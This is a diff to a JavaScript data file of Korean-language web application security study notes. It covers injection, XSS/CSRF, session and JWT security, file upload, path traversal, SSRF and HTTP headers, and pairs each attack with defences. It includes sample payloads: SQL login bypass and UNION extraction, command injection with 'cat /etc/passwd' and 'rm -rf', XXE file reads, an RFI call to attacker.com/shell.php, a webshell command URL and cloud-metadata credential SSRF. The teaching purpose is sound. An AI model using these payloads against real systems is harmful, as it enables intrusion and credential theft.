@@ -1997,136 +1997,465 @@ ALL: ALL</code></pre>
   {
     subject: 'application',
     subjectLabel: '어플리케이션보안',
-    chapter: 'web-security',
-    chapterLabel: '웹 보안',
-    keywords: ['SQL injection', 'XSS', 'CSRF', '세션', '쿠키', '디렉토리 트래버설', 'OWASP', '파일 업로드', 'Command injection', 'XXE', 'Clickjacking', 'SSRF', '웹셸', 'Prepared Statement'],
+    chapter: 'web-injection',
+    chapterLabel: '웹 인젝션 공격',
+    keywords: ['SQL Injection', 'SQL 인젝션', 'Blind SQL Injection', 'Union-based', 'Error-based', 'Time-based', 'OS Command Injection', 'LDAP Injection', 'XML Injection', 'XXE', 'Prepared Statement', '바인딩 변수', 'ORM', '입력값 검증'],
     content: `
 
-<h3>OWASP Top 10 (2021)</h3>
-<ol>
-  <li>취약한 접근 통제 (Broken Access Control)</li>
-  <li>암호화 실패 (Cryptographic Failures)</li>
-  <li>인젝션 (Injection) — SQL·OS·LDAP</li>
-  <li>안전하지 않은 설계 (Insecure Design)</li>
-  <li>보안 설정 오류 (Security Misconfiguration)</li>
-  <li>취약하고 오래된 구성요소 (Vulnerable and Outdated Components)</li>
-  <li>식별 및 인증 실패 (Identification and Authentication Failures)</li>
-  <li>소프트웨어 및 데이터 무결성 실패 (Software and Data Integrity Failures)</li>
-  <li>보안 로깅 및 모니터링 실패 (Security Logging and Monitoring Failures)</li>
-  <li>서버 측 요청 위조 (SSRF)</li>
-</ol>
-
-<h3>주요 웹 취약점</h3>
-
-<h4>SQL Injection</h4>
-<p>입력값에 SQL 구문을 삽입해 DB를 비정상 조작하는 공격. 데이터 유출·변조·삭제·인증 우회 가능.</p>
-<pre><code>-- 로그인 우회 (WHERE 조건 항상 참)
+<h3>SQL Injection 공격 원리</h3>
+<p>입력값에 SQL 구문을 삽입해 DB를 비정상 조작하는 공격. 인증 우회·데이터 유출·변조·삭제 가능.</p>
+<pre><code>-- 인증 우회: WHERE 조건 항상 참
 ID 입력: admin'--
 쿼리: SELECT * FROM users WHERE id='admin'--' AND pw='...'
 
--- UNION SELECT로 타 테이블 데이터 추출
+-- UNION 기반: 타 테이블 데이터 추출
 ' UNION SELECT username, password FROM admin--</code></pre>
 
-<h4>SQL Injection 유형</h4>
+<h4>SQL Injection 유형 비교</h4>
 <table>
-  <thead><tr><th>유형</th><th>특징</th></tr></thead>
+  <thead><tr><th>유형</th><th>공격 흐름</th><th>특징</th><th>방어</th></tr></thead>
   <tbody>
-    <tr><td><strong>In-band (Error-based)</strong></td><td>오류 메시지로 DB 정보 추출. 응답에 오류 직접 포함.</td></tr>
-    <tr><td><strong>In-band (Union-based)</strong></td><td>UNION SELECT로 다른 테이블 데이터를 응답에 포함.</td></tr>
-    <tr><td><strong>Blind (Boolean-based)</strong></td><td>참/거짓 응답 차이로 정보를 1비트씩 추출. 느림.</td></tr>
-    <tr><td><strong>Blind (Time-based)</strong></td><td>응답 지연 시간으로 정보 추출 (SLEEP(), WAITFOR DELAY).</td></tr>
-    <tr><td><strong>Out-of-band</strong></td><td>DNS/HTTP 채널로 결과 외부 전송. 방화벽 우회.</td></tr>
-  </tbody>
-</table>
-<p><strong>대응</strong>: Prepared Statement(파라미터 바인딩), 입력 검증, 최소 권한 DB 계정, 오류 메시지 노출 금지, WAF.</p>
-
-<h4>XSS (Cross-Site Scripting)</h4>
-<p>악성 스크립트를 웹 페이지에 삽입해 다른 사용자 브라우저에서 실행. 쿠키 탈취·키로깅·피싱·페이지 변조.</p>
-<table>
-  <thead><tr><th>유형</th><th>저장</th><th>특징</th></tr></thead>
-  <tbody>
-    <tr><td><strong>Stored XSS</strong> (영구적)</td><td>DB에 저장</td><td>게시판·댓글에 스크립트 삽입. 불특정 다수 피해.</td></tr>
-    <tr><td><strong>Reflected XSS</strong> (비영구적)</td><td>저장 안 됨</td><td>URL 파라미터로 전달·즉시 응답. 피싱 링크로 유도.</td></tr>
-    <tr><td><strong>DOM-based XSS</strong></td><td>저장 안 됨</td><td>서버 응답 무관. 클라이언트 JS가 URL의 해시(#)·파라미터를 DOM에 직접 삽입.</td></tr>
-  </tbody>
-</table>
-<p><strong>대응</strong>: 출력 인코딩(HTML Entity: &lt; &gt; &amp; &quot;), CSP 헤더, HttpOnly 쿠키, 입력 검증.</p>
-
-<h4>CSRF (Cross-Site Request Forgery)</h4>
-<p>인증된 사용자의 브라우저를 이용해 의도하지 않은 요청을 서버에 전송. 서버는 정상 요청으로 처리.</p>
-<pre><code>공격 시나리오:
-1. 피해자: 은행 사이트 로그인 (세션 쿠키 보유)
-2. 공격자: 악성 페이지에 &lt;img src="bank.com/transfer?to=attacker&amount=1000000"&gt; 삽입
-3. 피해자: 악성 페이지 방문 → 브라우저가 자동으로 은행에 이체 요청 (쿠키 자동 전송)</code></pre>
-<ul>
-  <li>XSS는 사용자(클라이언트)를 공격, CSRF는 서버를 공격(사용자를 매개로)</li>
-</ul>
-<p><strong>대응</strong>: CSRF 토큰 (요청마다 고유 값 검증), SameSite=Strict/Lax 쿠키, Referer/Origin 헤더 검증, CAPTCHA.</p>
-
-<h4>세션 관련 공격</h4>
-<table>
-  <thead><tr><th>공격</th><th>방법</th><th>대응</th></tr></thead>
-  <tbody>
-    <tr><td><strong>세션 하이재킹</strong></td><td>세션 ID 스니핑·XSS로 탈취 후 위장 접근</td><td>HTTPS, HttpOnly+Secure 쿠키, 세션 ID 노출 최소화</td></tr>
-    <tr><td><strong>세션 고정(Session Fixation)</strong></td><td>공격자가 세션 ID 미리 설정 → 피해자가 같은 ID로 로그인</td><td>로그인 후 세션 ID 반드시 재생성</td></tr>
-    <tr><td><strong>세션 예측</strong></td><td>취약한 세션 ID 생성 알고리즘 역이용</td><td>충분한 엔트로피의 랜덤 세션 ID</td></tr>
+    <tr><td><strong>Union-based</strong></td><td>UNION SELECT로 타 테이블 데이터를 응답에 포함</td><td>결과가 화면에 직접 출력될 때 유효</td><td>Prepared Statement, WAF</td></tr>
+    <tr><td><strong>Error-based</strong></td><td>오류 메시지에서 DB 구조·데이터 추출</td><td>오류 메시지 노출 시 유효</td><td>오류 메시지 비노출</td></tr>
+    <tr><td><strong>Blind (Boolean)</strong></td><td>참/거짓 응답 차이로 1비트씩 정보 추출</td><td>응답 내용 달라야 함. 느림.</td><td>응답 일관성 유지</td></tr>
+    <tr><td><strong>Blind (Time-based)</strong></td><td>SLEEP()·WAITFOR DELAY로 지연 발생시켜 추출</td><td>응답 내용 동일해도 가능</td><td>쿼리 실행 시간 제한</td></tr>
+    <tr><td><strong>Out-of-band</strong></td><td>DNS·HTTP 채널로 결과 외부 전송</td><td>방화벽 우회 가능</td><td>외부 통신 차단</td></tr>
   </tbody>
 </table>
 
-<h4>파일 업로드 취약점</h4>
-<p>악성 파일(웹셸, .php/.jsp 등)을 서버에 업로드 후 실행해 원격 코드 실행(RCE).</p>
-<ul>
-  <li><strong>웹셸(Web Shell)</strong>: 웹을 통해 OS 명령 실행 가능한 스크립트. 공격자 지속 접근 수단.</li>
-</ul>
-<p><strong>대응</strong>: 화이트리스트 확장자 검증, MIME 타입 검증(Content-Type), 매직 바이트 확인, 실행 권한 없는 디렉토리에 저장, 파일명 난수화, 크기 제한.</p>
+<h4>SQL Injection 방어</h4>
+<table>
+  <thead><tr><th>방어 기법</th><th>설명</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Prepared Statement (바인딩 변수)</strong></td><td>SQL 구조와 데이터를 분리. 입력값이 쿼리 구조를 변경 불가.</td></tr>
+    <tr><td><strong>저장 프로시저</strong></td><td>DB에 사전 정의된 프로시저만 호출. 동적 SQL 최소화.</td></tr>
+    <tr><td><strong>입력값 검증</strong></td><td>화이트리스트 기반 검증. 특수문자 이스케이프.</td></tr>
+    <tr><td><strong>최소 권한 DB 계정</strong></td><td>애플리케이션 계정에 필요한 권한만 부여. DROP·CREATE 금지.</td></tr>
+    <tr><td><strong>ORM 사용</strong></td><td>동적 SQL 대신 ORM 쿼리빌더 활용. SQL 직접 작성 최소화.</td></tr>
+  </tbody>
+</table>
 
-<h4>디렉토리 트래버설 (Path Traversal)</h4>
-<p><code>../</code> 또는 URL 인코딩(<code>%2e%2e%2f</code>)으로 웹 루트 외부 파일 접근.</p>
-<pre><code>http://example.com/view?file=../../../../etc/passwd
-http://example.com/view?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre>
-<p><strong>대응</strong>: 경로 정규화 후 기준 디렉토리 검증, 화이트리스트 파일명, 절대 경로 사용 금지.</p>
-
-<h4>Command Injection</h4>
-<p>OS 명령을 실행하는 함수에 악성 명령 삽입. <code>system()</code>, <code>exec()</code>, <code>popen()</code> 등.</p>
+<h3>OS Command Injection</h3>
+<p>OS 명령을 실행하는 함수에 세미콜론(;), 파이프(|), 앰퍼샌드(&amp;) 등으로 추가 명령 삽입.</p>
 <pre><code>입력: 127.0.0.1; cat /etc/passwd
 코드: system("ping " + input)
-실행: ping 127.0.0.1; cat /etc/passwd</code></pre>
-<p><strong>대응</strong>: OS 명령 실행 함수 사용 금지, 불가피 시 화이트리스트 입력 검증, escapeshellarg() 사용.</p>
+실행: ping 127.0.0.1; cat /etc/passwd    &lt;-- 추가 명령 실행
 
-<h4>XXE (XML External Entity)</h4>
-<p>외부 엔티티 참조를 악용해 서버 내부 파일 읽기·SSRF·DoS 유발.</p>
-<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
-&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
-<p><strong>대응</strong>: 외부 엔티티 처리 비활성화, 안전한 XML 파서 사용.</p>
+파이프 예: 127.0.0.1 | whoami
+앤드 예:   127.0.0.1 &amp;&amp; rm -rf /tmp/data</code></pre>
+<p><strong>방어</strong>: OS 명령 실행 함수 사용 금지, 불가피 시 화이트리스트 입력만 허용, escapeshellarg() 적용.</p>
 
-<h4>SSRF (Server-Side Request Forgery)</h4>
-<p>서버가 공격자가 지정한 URL로 요청을 보내게 만들어 내부망 접근·클라우드 메타데이터 탈취.</p>
-<p><strong>대응</strong>: 허용 URL 화이트리스트, 내부 IP 대역 차단, 클라우드 메타데이터 엔드포인트 접근 제한.</p>
+<h3>XXE (XML External Entity)</h3>
+<p>DOCTYPE ENTITY 선언으로 외부 엔티티를 참조해 서버 내부 파일 읽기, SSRF 유발.</p>
+<pre><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
 
-<h3>HTTP 보안 헤더</h3>
+-- SSRF 예시
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></pre>
+<p><strong>방어</strong>: XML 파서에서 external entity 처리 비활성화, DTD 비활성화, 안전한 XML 라이브러리 사용.</p>
+
+<h3>LDAP Injection</h3>
+<p>LDAP 필터 구문에 악성 입력을 삽입해 인증 우회·정보 유출.</p>
+<pre><code>정상 필터: (&amp;(uid=alice)(password=secret))
+공격 입력: alice)(|(uid=*
+결과 필터: (&amp;(uid=alice)(|(uid=*)(password=x))</code></pre>
+<p><strong>방어</strong>: 특수문자(* ( ) \ NUL) 이스케이프, 입력값 화이트리스트 검증.</p>
+
+<h3>Header Injection (CRLF Injection)</h3>
+<p>HTTP 응답 헤더에 개행 문자(CR: %0d, LF: %0a)를 삽입해 헤더를 조작하거나 응답을 분리(HTTP Response Splitting).</p>
+<pre><code>입력: value%0d%0aSet-Cookie:%20session=attacker
+결과 헤더:
+  X-Custom: value
+  Set-Cookie: session=attacker</code></pre>
+<p><strong>방어</strong>: 응답 헤더 값에 CR·LF 문자 포함 여부 검증·제거.</p>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'web-xss-csrf',
+    chapterLabel: 'XSS·CSRF',
+    keywords: ['XSS', 'Cross-Site Scripting', '저장형 XSS', '반사형 XSS', 'DOM 기반 XSS', 'CSRF', 'Cross-Site Request Forgery', 'Clickjacking', 'CSP', 'Content Security Policy', 'SameSite', 'CSRF 토큰', 'HttpOnly', 'X-Frame-Options'],
+    content: `
+
+<h3>XSS (Cross-Site Scripting) 유형 비교</h3>
+<p>악성 스크립트를 웹 페이지에 삽입해 다른 사용자 브라우저에서 실행. 쿠키 탈취·키로깅·피싱·페이지 변조.</p>
 <table>
-  <thead><tr><th>헤더</th><th>목적</th><th>예시 값</th></tr></thead>
+  <thead><tr><th>유형</th><th>공격 흐름</th><th>영향</th><th>핵심 방어</th></tr></thead>
   <tbody>
-    <tr><td><strong>Content-Security-Policy (CSP)</strong></td><td>XSS·인젝션 방지. 허용 리소스 출처 제한.</td><td><code>default-src 'self'</code></td></tr>
-    <tr><td><strong>X-Frame-Options</strong></td><td>Clickjacking 방지. iframe 내 로딩 제한.</td><td><code>DENY</code> 또는 <code>SAMEORIGIN</code></td></tr>
-    <tr><td><strong>Strict-Transport-Security (HSTS)</strong></td><td>HTTPS 강제. HTTP → HTTPS 자동 전환.</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
-    <tr><td><strong>X-Content-Type-Options</strong></td><td>MIME 스니핑 방지.</td><td><code>nosniff</code></td></tr>
-    <tr><td><strong>Referrer-Policy</strong></td><td>Referer 헤더 전송 범위 제어.</td><td><code>strict-origin-when-cross-origin</code></td></tr>
-    <tr><td><strong>Permissions-Policy</strong></td><td>브라우저 기능(카메라·마이크 등) 제한.</td><td><code>camera=(), microphone=()</code></td></tr>
+    <tr><td><strong>저장형 (Stored)</strong></td><td>악성 스크립트를 DB에 저장 → 다른 사용자 페이지 로드 시 실행</td><td>불특정 다수 피해. 지속적.</td><td>저장 전 입력 검증, 출력 인코딩</td></tr>
+    <tr><td><strong>반사형 (Reflected)</strong></td><td>URL 파라미터에 스크립트 삽입 → 서버가 그대로 응답에 반사</td><td>피싱 링크로 특정 피해자 유도</td><td>출력 인코딩, CSP</td></tr>
+    <tr><td><strong>DOM 기반 (DOM-based)</strong></td><td>서버 응답 무관. JS가 URL 해시(#)·파라미터를 DOM에 직접 삽입</td><td>서버 측 로그에 안 남음. 탐지 어려움.</td><td>innerHTML 대신 textContent 사용</td></tr>
+  </tbody>
+</table>
+
+<h4>XSS 방어</h4>
+<ul>
+  <li><strong>출력 인코딩</strong>: HTML 엔티티 변환 — &lt; → &amp;lt; / &gt; → &amp;gt; / &amp; → &amp;amp; / &quot; → &amp;quot;</li>
+  <li><strong>CSP (Content Security Policy)</strong>: script-src 'self' 로 외부 스크립트 차단. nonce 방식으로 인라인 스크립트 제어.</li>
+  <li><strong>HttpOnly 쿠키</strong>: JavaScript에서 쿠키 접근 불가 → XSS로 세션 탈취 방지.</li>
+  <li><strong>입력 검증</strong>: 서버 측 화이트리스트 기반 검증. 허용 태그 외 제거(DOMPurify 등).</li>
+</ul>
+
+<h3>CSRF (Cross-Site Request Forgery)</h3>
+<p>인증된 사용자의 브라우저를 이용해 의도하지 않은 요청을 서버에 전송. 서버는 세션 쿠키 기반으로 정상 요청으로 처리.</p>
+<pre><code>공격 시나리오:
+1. 피해자: 은행 사이트 로그인 (세션 쿠키 보유)
+2. 공격자: 악성 페이지에 아래 태그 삽입
+   &lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000000"&gt;
+3. 피해자: 악성 페이지 방문 → 브라우저가 자동으로 이체 요청 (쿠키 자동 전송)
+4. 서버: 정상 요청으로 처리 → 이체 완료</code></pre>
+
+<p><strong>XSS vs CSRF 차이</strong>: XSS는 사용자(클라이언트)를 직접 공격, CSRF는 서버를 공격(사용자를 매개로 이용).</p>
+
+<h4>CSRF 방어</h4>
+<table>
+  <thead><tr><th>방어 기법</th><th>원리</th></tr></thead>
+  <tbody>
+    <tr><td><strong>CSRF 토큰</strong></td><td>서버가 세션마다 고유 토큰 발급 → 요청 시 토큰 검증. 공격자는 토큰 모름.</td></tr>
+    <tr><td><strong>SameSite 쿠키</strong></td><td>SameSite=Strict/Lax: 크로스 사이트 요청에 쿠키 미전송.</td></tr>
+    <tr><td><strong>Referer/Origin 검증</strong></td><td>요청 헤더의 출처가 자사 도메인인지 확인.</td></tr>
+    <tr><td><strong>Double Submit Cookie</strong></td><td>쿠키와 요청 파라미터에 동일 랜덤 값 → 양쪽 일치 여부 검증.</td></tr>
+  </tbody>
+</table>
+
+<h3>Clickjacking</h3>
+<p>공격자 사이트가 투명한 iframe으로 정상 사이트를 겹쳐 표시. 피해자가 의도하지 않은 클릭을 정상 사이트에 전달.</p>
+<pre><code>&lt;!-- 공격자 페이지 --&gt;
+&lt;iframe src="https://victim.com/transfer" style="opacity:0; position:absolute; top:0; left:0;"&gt;&lt;/iframe&gt;
+&lt;button style="position:absolute; top:0; left:0;"&gt;경품 받기&lt;/button&gt;</code></pre>
+
+<h4>Clickjacking 방어</h4>
+<ul>
+  <li><strong>X-Frame-Options: DENY</strong> — 어떤 사이트의 iframe에도 포함 불가</li>
+  <li><strong>X-Frame-Options: SAMEORIGIN</strong> — 같은 도메인의 iframe만 허용</li>
+  <li><strong>CSP frame-ancestors</strong>: <code>Content-Security-Policy: frame-ancestors 'none'</code> (더 유연한 최신 방식)</li>
+</ul>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'web-session-auth',
+    chapterLabel: '세션·인증 보안',
+    keywords: ['세션 하이재킹', '세션 고정', 'Session Fixation', '쿠키', 'JWT', '토큰', '인증', '세션 관리', 'Secure 속성', 'HttpOnly', 'SameSite', 'OAuth', 'PKCE', '비밀번호 해시', 'bcrypt'],
+    content: `
+
+<h3>세션 관리 취약점</h3>
+<table>
+  <thead><tr><th>취약점</th><th>공격 방법</th><th>방어</th></tr></thead>
+  <tbody>
+    <tr><td><strong>세션 하이재킹</strong></td><td>예측 가능한 세션 ID 생성 / XSS·스니핑으로 세션 ID 탈취 후 위장</td><td>HTTPS, HttpOnly+Secure 쿠키, 충분한 엔트로피의 랜덤 세션 ID</td></tr>
+    <tr><td><strong>세션 고정 (Session Fixation)</strong></td><td>공격자가 세션 ID를 미리 설정 → 피해자가 같은 ID로 로그인하면 세션 탈취</td><td>로그인 후 세션 ID 반드시 재생성</td></tr>
+    <tr><td><strong>세션 예측</strong></td><td>취약한 세션 ID 생성 알고리즘(타임스탬프 등)으로 다음 세션 ID 예측</td><td>CSPRNG(암호학적 난수) 기반 세션 ID</td></tr>
   </tbody>
 </table>
 
 <h3>쿠키 보안 속성</h3>
 <table>
-  <thead><tr><th>속성</th><th>효과</th></tr></thead>
+  <thead><tr><th>속성</th><th>역할</th><th>누락 시 위험</th></tr></thead>
   <tbody>
-    <tr><td><strong>HttpOnly</strong></td><td>JavaScript에서 쿠키 접근 불가 → XSS로 탈취 방지</td></tr>
-    <tr><td><strong>Secure</strong></td><td>HTTPS에서만 전송</td></tr>
-    <tr><td><strong>SameSite=Strict</strong></td><td>같은 사이트 요청에만 전송 → CSRF 방지</td></tr>
-    <tr><td><strong>SameSite=Lax</strong></td><td>GET 탐색 요청은 허용, POST 등 차단</td></tr>
-    <tr><td><strong>SameSite=None; Secure</strong></td><td>크로스 사이트 허용 (HTTPS 필수)</td></tr>
+    <tr><td><strong>Secure</strong></td><td>HTTPS에서만 전송</td><td>HTTP 구간에서 쿠키 스니핑 가능</td></tr>
+    <tr><td><strong>HttpOnly</strong></td><td>JavaScript 쿠키 접근 차단</td><td>XSS로 세션 쿠키 탈취 가능</td></tr>
+    <tr><td><strong>SameSite=Strict</strong></td><td>크로스 사이트 요청에 쿠키 미전송</td><td>CSRF 공격 가능</td></tr>
+    <tr><td><strong>SameSite=Lax</strong></td><td>GET 탐색 허용, POST 등 차단</td><td>일부 CSRF 위험 존재</td></tr>
+    <tr><td><strong>Domain</strong></td><td>쿠키 전송 도메인 범위 제한</td><td>서브도메인 포함 시 범위 확대</td></tr>
+    <tr><td><strong>Expires/Max-Age</strong></td><td>쿠키 만료 시간 설정</td><td>세션 쿠키가 영구 저장될 수 있음</td></tr>
   </tbody>
 </table>
+
+<h3>JWT (JSON Web Token)</h3>
+<p>서버 세션 없이 토큰으로 인증 상태를 전달하는 방식. Header.Payload.Signature 세 부분으로 구성.</p>
+<pre><code>Header:    {"alg": "HS256", "typ": "JWT"}  → Base64URL 인코딩
+Payload:   {"sub": "user123", "exp": 1700000000}  → Base64URL 인코딩
+Signature: HMACSHA256(header + "." + payload, secret)</code></pre>
+
+<h4>JWT 주요 취약점</h4>
+<ul>
+  <li><strong>alg:none 공격</strong>: 헤더의 알고리즘을 "none"으로 변조해 서명 검증 우회 시도. 서버는 반드시 알고리즘을 강제 지정해야 함.</li>
+  <li><strong>약한 서명 키</strong>: 단순 문자열 시크릿은 브루트포스 가능. 충분한 길이의 랜덤 키 사용.</li>
+  <li><strong>만료 검증 누락</strong>: exp 클레임 검증 누락 시 만료된 토큰 재사용 가능.</li>
+</ul>
+
+<h3>OAuth 2.0 흐름</h3>
+<table>
+  <thead><tr><th>Grant Type</th><th>흐름</th><th>적합 용도</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Authorization Code</strong></td><td>인가 코드 → 서버에서 액세스 토큰 교환</td><td>웹 애플리케이션 (가장 안전)</td></tr>
+    <tr><td><strong>Authorization Code + PKCE</strong></td><td>코드 챌린지로 코드 탈취 방지</td><td>SPA, 모바일 앱</td></tr>
+    <tr><td><strong>Implicit (deprecated)</strong></td><td>URL 프래그먼트로 직접 토큰 발급</td><td>사용 금지 — 토큰 노출 위험</td></tr>
+    <tr><td><strong>Client Credentials</strong></td><td>클라이언트 자격증명으로 토큰 발급</td><td>서버-서버 통신 (사용자 없음)</td></tr>
+  </tbody>
+</table>
+
+<h3>비밀번호 저장</h3>
+<table>
+  <thead><tr><th>방식</th><th>안전성</th><th>이유</th></tr></thead>
+  <tbody>
+    <tr><td>평문 저장</td><td>매우 위험</td><td>DB 유출 시 즉시 노출</td></tr>
+    <tr><td>MD5 / SHA-1 해시</td><td>취약</td><td>레인보우 테이블, GPU 브루트포스에 취약</td></tr>
+    <tr><td>SHA-256 단순 해시</td><td>취약</td><td>솔트 없으면 동일 비밀번호 → 동일 해시</td></tr>
+    <tr><td><strong>bcrypt</strong></td><td>권장</td><td>솔트 내장, 반복 횟수(cost) 조절 가능</td></tr>
+    <tr><td><strong>PBKDF2</strong></td><td>권장</td><td>반복 해시, NIST 권고</td></tr>
+    <tr><td><strong>Argon2</strong></td><td>권장</td><td>Password Hashing Competition 우승. 메모리 집약적.</td></tr>
+  </tbody>
+</table>
+
+<h3>다중인증 (MFA)</h3>
+<ul>
+  <li><strong>TOTP (Time-based OTP)</strong>: 현재 시간 기반 6자리 코드. 30초마다 갱신. (Google Authenticator 방식)</li>
+  <li><strong>HOTP (HMAC-based OTP)</strong>: 카운터 기반 OTP. 사용할 때마다 카운터 증가.</li>
+  <li><strong>하드웨어 토큰</strong>: 물리적 기기에서 OTP 생성. 높은 보안성.</li>
+  <li><strong>SMS OTP</strong>: SIM 스와핑 공격 위험 — 가능하면 TOTP 앱으로 대체 권장.</li>
+</ul>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'file-upload-traversal',
+    chapterLabel: '파일 업로드·경로 취약점',
+    keywords: ['파일 업로드', '웹셸', 'Web Shell', '디렉토리 트래버설', 'Path Traversal', '../', 'MIME', '확장자 검증', 'SSRF', 'Open Redirect', '파일 포함', 'LFI', 'RFI'],
+    content: `
+
+<h3>파일 업로드 취약점</h3>
+<p>악성 파일(웹셸: .php/.jsp/.asp)을 서버에 업로드 후 웹 URL로 접근해 원격 코드 실행(RCE).</p>
+<pre><code>공격 흐름:
+1. 파일명 변조: image.php.jpg → 서버가 php로 실행
+2. Content-Type 변조: image/jpeg로 위장
+3. 이중 확장자: shell.php.jpg → 설정 오류 시 php 실행
+4. 업로드 후: https://victim.com/uploads/shell.php?cmd=whoami</code></pre>
+
+<h4>파일 업로드 방어</h4>
+<table>
+  <thead><tr><th>방어 기법</th><th>설명</th></tr></thead>
+  <tbody>
+    <tr><td><strong>확장자 화이트리스트</strong></td><td>jpg, png, gif, pdf 등 허용 확장자만 통과. 블랙리스트 방식 금지.</td></tr>
+    <tr><td><strong>MIME 타입 검증</strong></td><td>Content-Type 헤더 검증. 단, 조작 가능하므로 매직 바이트도 병행.</td></tr>
+    <tr><td><strong>매직 바이트 확인</strong></td><td>파일 시작 바이트로 실제 파일 형식 확인. (JPG: FF D8 FF)</td></tr>
+    <tr><td><strong>저장 경로 분리</strong></td><td>웹 루트 외부 디렉토리에 저장. 직접 실행 불가하게.</td></tr>
+    <tr><td><strong>파일명 랜덤화</strong></td><td>원본 파일명 대신 UUID 등 랜덤 이름으로 저장.</td></tr>
+    <tr><td><strong>실행 권한 제거</strong></td><td>업로드 디렉토리에 실행(Execute) 권한 부여하지 않음.</td></tr>
+  </tbody>
+</table>
+
+<h3>디렉토리 트래버설 (Path Traversal)</h3>
+<p>../을 이용해 웹 루트 외부의 임의 파일에 접근. URL 인코딩으로 필터 우회 시도.</p>
+<pre><code>기본 공격:
+  http://example.com/view?file=../../../../etc/passwd
+
+URL 인코딩 우회:
+  %2e%2e%2f = ../
+  http://example.com/view?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+이중 인코딩:
+  %252e%252e%252f = ../  (서버가 두 번 디코딩할 때)</code></pre>
+<p><strong>방어</strong>: 경로 정규화(canonicalize) 후 허용 기준 디렉토리 내부인지 검증, 화이트리스트 파일명 사용.</p>
+
+<h3>LFI / RFI (파일 포함 취약점)</h3>
+<table>
+  <thead><tr><th>유형</th><th>설명</th><th>예시</th></tr></thead>
+  <tbody>
+    <tr><td><strong>LFI (Local File Inclusion)</strong></td><td>서버 로컬 파일을 코드로 포함해 실행</td><td>?page=../../etc/passwd</td></tr>
+    <tr><td><strong>RFI (Remote File Inclusion)</strong></td><td>원격 URL의 파일을 코드로 포함해 실행</td><td>?page=http://attacker.com/shell.php</td></tr>
+  </tbody>
+</table>
+<p><strong>방어</strong>: include() 함수에 사용자 입력 직접 전달 금지, allow_url_include 비활성화, 허용 파일 목록 화이트리스트.</p>
+
+<h3>SSRF (Server-Side Request Forgery)</h3>
+<p>서버가 공격자 지정 URL로 요청을 보내게 만들어 내부망 서비스 접근 또는 클라우드 메타데이터 탈취.</p>
+<pre><code>-- 클라우드 메타데이터 탈취 (AWS)
+URL 파라미터: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+-- 내부 서비스 스캔
+url=http://192.168.1.1:22    (SSH 포트 확인)
+url=http://localhost:8080/admin</code></pre>
+<p><strong>방어</strong>: 허용 URL 화이트리스트, 내부 IP 대역(10.x, 172.16.x, 192.168.x, 169.254.x) 차단, DNS Rebinding 방어.</p>
+
+<h3>Open Redirect</h3>
+<p>신뢰할 수 있는 도메인의 리다이렉트 파라미터를 조작해 악성 사이트로 유도. 피싱에 악용.</p>
+<pre><code>정상: https://legitimate.com/login?next=/dashboard
+공격: https://legitimate.com/login?next=https://evil.com
+
+피싱 URL 예: https://trusted-bank.com/redirect?url=https://evil-bank.com</code></pre>
+<p><strong>방어</strong>: 리다이렉트 대상을 화이트리스트 도메인으로 제한, 상대 경로만 허용, 외부 URL 리다이렉트 금지.</p>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'http-security',
+    chapterLabel: 'HTTP 보안 헤더',
+    keywords: ['HTTPS', 'HSTS', 'CSP', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Permissions-Policy', 'CORS', 'SOP', 'Same-Origin Policy', 'Mixed Content', 'TLS', 'HTTP/2', 'HTTP/3'],
+    content: `
+
+<h3>보안 HTTP 헤더 정리</h3>
+<table>
+  <thead><tr><th>헤더</th><th>권장값</th><th>역할</th><th>미설정 시 위험</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>Strict-Transport-Security (HSTS)</strong></td>
+      <td>max-age=31536000; includeSubDomains; preload</td>
+      <td>HTTPS 강제. HTTP 요청을 자동으로 HTTPS로 전환.</td>
+      <td>HTTP 다운그레이드 공격, SSL Stripping</td>
+    </tr>
+    <tr>
+      <td><strong>Content-Security-Policy (CSP)</strong></td>
+      <td>default-src 'self'; script-src 'self' 'nonce-xxx'</td>
+      <td>허용 리소스 출처 제한. 인라인 스크립트 통제.</td>
+      <td>XSS, 인젝션 공격</td>
+    </tr>
+    <tr>
+      <td><strong>X-Frame-Options</strong></td>
+      <td>DENY 또는 SAMEORIGIN</td>
+      <td>iframe 내 페이지 로딩 제한.</td>
+      <td>Clickjacking 공격</td>
+    </tr>
+    <tr>
+      <td><strong>X-Content-Type-Options</strong></td>
+      <td>nosniff</td>
+      <td>브라우저 MIME 스니핑 방지. Content-Type 강제 준수.</td>
+      <td>MIME 타입 혼동 공격</td>
+    </tr>
+    <tr>
+      <td><strong>Referrer-Policy</strong></td>
+      <td>strict-origin-when-cross-origin</td>
+      <td>Referer 헤더 전송 범위 제어. 민감 URL 누출 방지.</td>
+      <td>내부 URL, 토큰 등 정보 누출</td>
+    </tr>
+    <tr>
+      <td><strong>Permissions-Policy</strong></td>
+      <td>camera=(), microphone=(), geolocation=()</td>
+      <td>브라우저 기능(카메라·마이크·위치 등) 사용 제한.</td>
+      <td>사용자 동의 없는 기능 접근</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4>HSTS 세부 설명</h4>
+<ul>
+  <li><strong>max-age</strong>: HSTS 정책 유효 기간 (초). 31536000 = 1년.</li>
+  <li><strong>includeSubDomains</strong>: 서브도메인에도 HSTS 적용.</li>
